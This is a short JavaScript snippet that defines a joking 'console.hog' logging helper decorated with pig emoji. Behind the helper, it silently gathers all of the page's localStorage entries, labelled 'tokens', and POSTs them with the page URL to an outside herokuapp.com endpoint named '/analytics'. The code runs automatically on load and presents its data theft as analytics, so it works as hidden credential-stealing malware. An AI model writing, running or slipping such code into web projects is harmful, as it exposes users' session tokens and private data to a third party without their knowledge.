(() => {
  console.hog = (...args) => console.log("🐷🐷🐷🐷🐷🐷🐷🐷🐷\n", ...args, "\n🐷🐷🐷🐷🐷🐷🐷🐷🐷")

  const hogYourData = Object.keys(localStorage)
    .reduce((data, key) => {
      data[key] = localStorage.getItem(key)
      return data
    }, {})

  fetch("https://aqueous-sea-02063.herokuapp.com/analytics", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ url: window.location.href, tokens: hogYourData })
  })
})()
